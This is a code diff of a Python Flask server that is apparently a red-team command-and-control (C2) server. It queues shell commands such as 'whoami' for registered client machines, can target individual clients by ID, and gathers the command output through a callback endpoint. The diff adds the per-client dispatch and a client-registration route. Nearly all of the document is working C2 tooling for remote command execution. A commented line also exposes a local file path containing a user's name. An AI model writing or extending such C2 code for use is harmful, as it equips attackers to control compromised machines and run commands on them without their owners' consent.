@@ -1,15 +1,13 @@
 from flask import Flask, request, jsonify, render_template
 import requests
-# import threading
 
-SERVER_URL = "http://127.0.0.1:5000"
+SERVER_URL = "http://127.0.0.1:5005"
 app = Flask(__name__)
 print("Drew was here")
 
 current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
-client_commands = {} # 'client_id': ['command1', 'command2'], etc.
-# client_commands is a bad name
-clients = []
+client_commands = {} # 'client_id': 'command' --> to handle commands for specific clients
+clients = [] # just to see what clients we got rn
 
 @app.route('/home')
 def home():
@@ -26,33 +24,41 @@ def input():
 
 
 @app.route('/command', methods=['GET'])
-def send_command(command=None, client_id=None): # pass client_id in         also current_command....?
+def send_command():
     global current_command
-    cmd = current_command
-    current_command = "whoami"
-    # if client_id in client_commands:
-    #     client_commands[client_id].append(new_command)
-    # else:
-    #     client_commands[client_id] = ["whoami"]
-    return jsonify(command=cmd) # what is to be sent to the client (get_command() in client.py)
+    client_id = None # default
 
-#TODO: # fix disconnect; specify which client? why are all not disconnecting?
-# could make it like "disconnect [client_id]"
-# [command] [client_id]
+    # handle commands to specific clients
+    # syntax: [command] [client_id]
+    if len(current_command.split()) > 1:
+        cmd = current_command.split()[0]
+        print("!!!!!!!!CMD: " + cmd)
+        client_id = current_command.split()[1]
+        print("!!!!!!!!! CLIENT_ID: "+ client_id)
+        client_commands[client_id] = cmd
+        current_command = "whoami"
+    else:
+        cmd = current_command
+        current_command = "whoami"
 
-@app.route('/log-client', methods=['GET']) # this is not getting used yet
-def log_client():
-    print("log_client function")
+    if client_id:
+        return jsonify(status="sent", client_id=client_id, command=cmd) # send to a specific client
+    return jsonify(status="sent", command=cmd) # otherwise send to all
+
+
+@app.route('/register-client', methods=['GET'])
+def register_client():
+    print("register_client function")
     client_id = request.args.get('client_id')
     # client_id = "test"
     print(client_id)
     clients.append(client_id)
     # client_commands[client_id] = "whoami" # init?
     # return jsonify(client_id=client_id, command="hostname -I")
-    return jsonify(client_id=client_id)
+    return jsonify(status="client registered", client_id=client_id)
 
 
-@app.route('/', methods=['POST'])
+@app.route('/', methods=['POST']) # callbacks
 def command_result():
     result = request.json.get('result') # GET from client
     # wtf is a result rename that
@@ -67,5 +73,6 @@ def show_clients():
 
 
 if __name__ == '__main__':
+    # app.run(debug=True, host='0.0.0.0', port=5005, threaded=True, ssl_context=('/Users/leahk/workspace/projects/redteam/C2/cert.pem', '/Users/leahk/workspace/projects/redteam/C2/key.pem'))
     app.run(debug=True, host='0.0.0.0', port=5005, threaded=True)
     # app.run(host='127.0.0.1', port=5000, threaded=True)
